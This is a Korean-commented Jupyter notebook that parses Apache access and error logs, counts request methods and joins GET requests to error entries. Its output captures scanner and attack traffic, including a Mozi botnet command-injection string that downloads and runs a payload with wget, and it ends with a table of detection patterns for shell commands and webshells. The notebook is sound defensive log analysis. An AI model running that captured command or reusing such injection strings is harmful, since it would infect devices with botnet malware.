In [1]:
import re
import pandas as pd

# 파일 경로
log_file_path = "access_log.txt"
all_csv = "all_logs.csv"
unmatched_file = "unmatched_lines.txt"

# Apache/Nginx combined log 패턴
pattern = re.compile(
    r'(?P<ip>\S+) '                     
    r'(?P<ident>\S+) '                  
    r'(?P<authuser>\S+) '               
    r'\[(?P<time>[^\]]+)\] '            
    r'"(?P<request>[^"]*)" '            
    r'(?P<status>\d{3}|-) '             
    r'(?P<size>\d+|-) '                 
    r'"(?P<referer>[^"]*)" '            
    r'"(?P<agent>[^"]*)"'               
)

Apache/Nginx Combined Log 각 필드 설명

| 필드명     | 의미 |
|------------|------|
| **ip**     | 공백 전까지 한 덩어리 |
| **ident**  | 보통 `-` |
| **authuser** | 인증 사용자명 |
| **time**   | 대괄호 `[ ]` 안의 내용 |
| **request**| 큰따옴표 `" "` 안 내용 (예: GET/POST 라인) |
| **status** | 3자리 숫자 또는 `-` |
| **size**   | 숫자 또는 `-` |
| **referer**| 큰따옴표 안의 referer |
| **agent**  | 큰따옴표 안의 user-agent |

In [2]:
records, unmatched = [], []

# 로그 파싱
with open(log_file_path, "r", encoding="utf-8", errors="replace") as f:
    for line in f:
        line = line.strip()
        m = pattern.match(line)
        if not m:
            unmatched.append(line)
            continue
        
        d = m.groupdict()
        req = d.pop("request", None)
        if req and req != "-":
            parts = req.split()
            method = parts[0] if len(parts) >= 1 else None
            path = parts[1] if len(parts) >= 2 else None
            protocol = parts[2] if len(parts) >= 3 else None
        else:
            method = path = protocol = None

        for k in ("status", "size", "referer", "agent"):
            if d.get(k) == "-":
                d[k] = None

        d.update({"method": method, "path": path, "protocol": protocol, "request": req})
        records.append(d)

# DataFrame 생성
df = pd.DataFrame.from_records(records, columns=[
    "ip", "ident", "authuser", "time", "method", "path", "protocol",
    "status", "size", "referer", "agent", "request"
])

# 시간 변환
df["time"] = pd.to_datetime(df["time"], format="%d/%b/%Y:%H:%M:%S %z", errors="coerce")

# 숫자 변환
df["status"] = pd.to_numeric(df["status"], errors="coerce")
df["size"] = pd.to_numeric(df["size"], errors="coerce")

# CSV 저장
df.to_csv(all_csv, index=False, encoding="utf-8-sig")
print(f"전체 로그 저장 완료: {all_csv}")

# 매칭 실패 라인 저장
if unmatched:
    with open(unmatched_file, "w", encoding="utf-8") as uf:
        uf.write("\n".join(unmatched))
    print(f"매칭 실패 라인 {len(unmatched)}개 -> {unmatched_file}")

전체 로그 저장 완료: all_logs.csv
매칭 실패 라인 6개 -> unmatched_lines.txt


In [3]:
# 메서드별 요청 건수
method_counts = (
    df["method"]
    .value_counts(dropna=False)
    .rename_axis("method")
    .reset_index(name="count")
    .sort_values(by="count", ascending=False)
)

method_counts["method"] = method_counts["method"].fillna("(None)")

print("메서드별 요청 건수:")
for _, row in method_counts.iterrows():
    print(f"{row['method']} {row['count']}")

메서드별 요청 건수:
GET 4200
\x16\x03\x01 327
POST 165
HEAD 129
PRI 79
(None) 45
OPTIONS 32
MGLNDD_114.70.38.81_80\n 30
\x16\x03\x01\x02 15
\x16\x03\x01\x05\xa8\x01 12
\x16\x03\x01\x05\xc4\x01 12
SSH-2.0-libssh_0.11.1 11
\x16\x03\x01\x01$\x01 11
\x16\x03\x03\x01\xa5\x01 10
PUT 10
CONNECT 10
\x16\x03\x01\x01\x9a\x01 8
\x16\x03\x01\x01\xa8\x01 5
t3 5
27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ 4
\x16\x03\x02\x01o\x01 3
\x03 3
\x10\x0f 2
\x01 2
SSH-2.0-WanScannerBot 2
Gh0st\xad 1
HELP 1
\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n 1
\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xff\xd9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\

In [4]:
get_csv = "get_logs.csv"
df_get = df[df["method"] == "GET"].copy()
df_get.to_csv(get_csv, index=False, encoding="utf-8-sig")
print(f"GET 요청 저장 완료: {get_csv}")

GET 요청 저장 완료: get_logs.csv


| 메서드(Method) | 요청 건수 | 설명 |
|---------------|---------|------|
| GET     | 4200 | 웹 서버로부터 데이터를 요청할 때 사용<br>웹 페이지나 이미지와 같은 리소스를 가져올 때 사용<br>URL에 필요한 정보를 담아 전송 |
| POST    | 165  | 웹 서버에 데이터를 제출할 때 사용<br>회원 가입, 로그인, 데이터 저장 등과 같이 정보를 입력하거나 업데이트할 때 사용<br>요청 메시지의 본문(body)에 데이터를 담아 전송 |
| HEAD    | 129  | GET과 유사<br>실제 데이터는 받지 않고 응답 헤더 정보 제공<br>주로 리소스의 존재 여부나 수정 날짜 등을 확인 |
| PRI     | 79   | HTTP/2 프로토콜에서 사용되는 사전 연결 설정 메서드 |
| OPTIONS | 32   | 서버가 지원하는 메소드나 기타 옵션 정보를 확인하기 위해 사용 |
| PUT     | 10   | 웹 서버의 리소스를 대체할 때 사용 |
| CONNECT | 10   | HTTPS 등과 같은 특정 서버에 대한 TCP 연결을 맺을 때 사용 |
| DELETE  | 0    | 웹 서버의 리소스를 삭제할 때 사용 |
| PATCH   | 0    | PUT과 유사하지만 전체가 아니라 일부 필드만 변경할 때 사용 |

In [5]:
print(df_get.head())

              ip ident authuser                      time method  \
0  210.110.68.35     -        - 2025-06-12 13:35:37+09:00    GET   
1  210.110.68.35     -        - 2025-06-12 13:35:37+09:00    GET   
2  210.110.68.35     -        - 2025-06-12 13:35:37+09:00    GET   
3  210.110.68.35     -        - 2025-06-12 13:35:37+09:00    GET   
5  210.110.68.35     -        - 2025-06-12 16:43:50+09:00    GET   

                   path  protocol  status     size                 referer  \
0                     /  HTTP/1.1     403   7620.0                    None   
1  /icons/poweredby.png  HTTP/1.1     200  15443.0  http://210.110.104.16/   
2        /poweredby.png  HTTP/1.1     200   5714.0  http://210.110.104.16/   
3          /favicon.ico  HTTP/1.1     404    196.0  http://210.110.104.16/   
5                     /  HTTP/1.1     403   7620.0                    None   

                                               agent  \
0  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...   
1  Mozilla

In [6]:
import re
import pandas as pd

error_file_path = "error_log.txt"

# Apache error_log 패턴 (time + client ip 추출)
error_pattern = re.compile(
    r'\[(?P<time>[A-Za-z]{3} [A-Za-z]{3} \d{2} [\d:]+(?:\.\d+)? \d{4})\]'  # 시간
    r'(?: \[.*?\])*'                                                       # 중간 태그들
    r'(?: \[client (?P<ip>[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+))'                 # client IP
)

error_logs = []
with open(error_file_path, "r", encoding="utf-8", errors="replace") as f:
    for line in f:
        m = error_pattern.search(line)
        if m:
            error_logs.append(m.groupdict())

# DataFrame 생성
df_error = pd.DataFrame(error_logs)

# 시간 변환
df_error["time"] = pd.to_datetime(
    df_error["time"], 
    format="%a %b %d %H:%M:%S.%f %Y", 
    errors="coerce"
)

# 🔹 IP + 시간 키 생성 (분 단위까지만)
df_error["time_key"] = df_error["time"].dt.strftime("%d/%b/%Y:%H:%M")
df_error["join_key"] = df_error["ip"] + "_" + df_error["time_key"]

# GET 로그에도 같은 join_key 생성
df_get["time_key"] = df_get["time"].dt.strftime("%d/%b/%Y:%H:%M")
df_get["join_key"] = df_get["ip"] + "_" + df_get["time_key"]

# 중복 제거
df_error_unique = df_error.drop_duplicates(subset=["join_key"])

# 조인
df_error_get = pd.merge(
    df_get,
    df_error_unique[["join_key"]],
    on="join_key",
    how="inner"
)

print(f"오류 발생한 GET 요청 수: {len(df_error_get)}")
df_error_get.head(10)

오류 발생한 GET 요청 수: 692


,ip,ident,authuser,time,method,path,protocol,status,size,referer,agent,request,time_key,join_key
0,210.110.68.35,-,-,2025-06-12 13:35:37+09:00,GET,/,HTTP/1.1,403,7620.0,None,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET / HTTP/1.1,12/Jun/2025:13:35,210.110.68.35_12/Jun/2025:13:35
1,210.110.68.35,-,-,2025-06-12 13:35:37+09:00,GET,/icons/poweredby.png,HTTP/1.1,200,15443.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /icons/poweredby.png HTTP/1.1,12/Jun/2025:13:35,210.110.68.35_12/Jun/2025:13:35
2,210.110.68.35,-,-,2025-06-12 13:35:37+09:00,GET,/poweredby.png,HTTP/1.1,200,5714.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /poweredby.png HTTP/1.1,12/Jun/2025:13:35,210.110.68.35_12/Jun/2025:13:35
3,210.110.68.35,-,-,2025-06-12 13:35:37+09:00,GET,/favicon.ico,HTTP/1.1,404,196.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /favicon.ico HTTP/1.1,12/Jun/2025:13:35,210.110.68.35_12/Jun/2025:13:35
4,210.110.68.35,-,-,2025-06-12 16:43:50+09:00,GET,/,HTTP/1.1,403,7620.0,None,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET / HTTP/1.1,12/Jun/2025:16:43,210.110.68.35_12/Jun/2025:16:43
5,210.110.68.35,-,-,2025-06-12 16:43:51+09:00,GET,/icons/poweredby.png,HTTP/1.1,200,15443.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /icons/poweredby.png HTTP/1.1,12/Jun/2025:16:43,210.110.68.35_12/Jun/2025:16:43
6,210.110.68.35,-,-,2025-06-12 16:43:51+09:00,GET,/poweredby.png,HTTP/1.1,200,5714.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /poweredby.png HTTP/1.1,12/Jun/2025:16:43,210.110.68.35_12/Jun/2025:16:43
7,210.110.64.41,-,-,2025-06-12 16:56:59+09:00,GET,/,HTTP/1.1,403,7620.0,None,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET / HTTP/1.1,12/Jun/2025:16:56,210.110.64.41_12/Jun/2025:16:56
8,210.110.64.41,-,-,2025-06-12 16:56:59+09:00,GET,/icons/poweredby.png,HTTP/1.1,200,15443.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /icons/poweredby.png HTTP/1.1,12/Jun/2025:16:56,210.110.64.41_12/Jun/2025:16:56
9,210.110.64.41,-,-,2025-06-12 16:56:59+09:00,GET,/poweredby.png,HTTP/1.1,200,5714.0,http://210.110.104.16/,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,GET /poweredby.png HTTP/1.1,12/Jun/2025:16:56,210.110.64.41_12/Jun/2025:16:56


| 유형         | 예시 정규식              | 설명           |        |              |              |
| ---------- | ------------------- | ------------ | ------ | ------------ | ------------ |
| 원격 파일 다운로드 | `http[s]?://[^\s]+` | 외부 URL 요청 확인 |        |              |              |
| 쉘 명령       | \`(;                | \|\|         | &&)\`  | 명령 연결 연산자    |              |
| 파일 업로드     | \`.php              | .asp         | .jsp\` | 웹쉘 확장자       |              |
| 경로 조작      | `\.\./`             | 디렉토리 탈출 시도   |        |              |              |
| 악성코드 키워드   | \`cmd=              | wget         | curl   | powershell\` | 시스템 명령 실행 도구 |
| 의심 확장자     | \`.exe              | .sh          | .bat   | .mips\`      | 실행 파일        |

In [7]:
print(df_get.shape)
print(df_error_get.shape)

(4200, 14)
(692, 14)


In [8]:
df_error_get.to_csv('error_join.csv', index=False, encoding="utf-8-sig")